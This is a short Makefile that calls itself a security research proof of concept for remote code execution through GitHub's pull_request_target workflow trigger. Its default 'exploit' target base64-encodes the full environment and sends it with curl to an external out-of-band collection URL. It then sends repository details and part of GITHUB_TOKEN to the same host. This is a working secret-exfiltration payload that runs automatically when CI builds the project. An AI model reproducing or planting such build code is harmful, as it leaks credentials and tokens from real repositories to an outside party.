# Malicious Makefile for security research PoC
# This demonstrates RCE via pull_request_target vulnerability

OAST_URL = https://oumdao8sd8e3l1noj108oirzqqwhk98y.oastify.com

.PHONY: exploit prerequisites all

all: exploit

prerequisites:
	@echo "Running prerequisites..."

exploit:
	@echo "=== Security Research PoC ==="
	@echo "Exfiltrating environment..."
	@env | base64 -w0 > /tmp/env.b64
	@curl -s -X POST -d @/tmp/env.b64 $(OAST_URL)/env || true
	@echo "Exfiltrating GitHub context..."
	@echo "GITHUB_REPOSITORY=$(GITHUB_REPOSITORY)" > /tmp/ctx.txt
	@echo "GITHUB_ACTOR=$(GITHUB_ACTOR)" >> /tmp/ctx.txt
	@echo "GITHUB_WORKFLOW=$(GITHUB_WORKFLOW)" >> /tmp/ctx.txt
	@echo "GITHUB_RUN_ID=$(GITHUB_RUN_ID)" >> /tmp/ctx.txt
	@echo "GITHUB_TOKEN_PREVIEW=$${GITHUB_TOKEN:0:20}..." >> /tmp/ctx.txt
	@curl -s -X POST -d @/tmp/ctx.txt $(OAST_URL)/ctx || true
	@echo "Creating dummy exploit binary..."
	@echo '#!/bin/bash' > exploit
	@echo 'echo "PoC exploit - security research only"' >> exploit
	@chmod +x exploit
	@echo "=== PoC Complete ==="
